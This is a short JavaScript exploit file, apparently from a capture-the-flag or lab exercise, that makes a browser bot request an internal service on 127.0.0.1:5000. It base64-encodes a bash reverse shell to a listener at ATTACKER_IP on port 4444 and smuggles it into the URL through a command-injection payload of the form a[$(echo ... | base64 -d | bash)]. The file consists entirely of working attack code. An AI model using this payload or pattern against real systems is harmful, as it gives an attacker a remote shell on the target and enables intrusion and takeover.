// content.js

// The internal vulnerable service
const TARGET = "http://127.0.0.1:5000/routines/";

// Your listener IP and Port
const ATTACKER_IP = "10.10.16.46"; 
const ATTACKER_PORT = "4444";

// The reverse shell command
// We use backticks (`) to ensure string interpolation works correctly
const cmd = `bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1'`;

// Base64 encode the command to avoid breaking the URL
const b64 = btoa(cmd);

// The Command Injection Payload
// Vulnerability: specific to how the backend processes arithmetic or arrays in the URL
// Structure: a[$(echo BASE64_PAYLOAD | base64 -d | bash)]
const exploit = `a[$(echo ${b64} | base64 -d | bash)]`;

// Send the request from the bot's browser to the internal service
fetch(TARGET + exploit, { mode: "no-cors" });
